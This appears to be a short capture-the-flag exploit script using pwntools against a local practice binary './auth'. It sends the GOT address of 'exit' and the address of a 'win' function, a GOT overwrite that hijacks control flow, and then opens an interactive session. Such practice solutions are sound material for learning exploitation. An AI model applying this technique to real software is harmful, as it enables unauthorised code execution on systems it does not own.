from pwn import *

e=ELF("./auth")
p=process("./auth")
p.sendline(hex(e.got['exit']))
p.sendline(hex(e.symbols['win']))
p.interactive()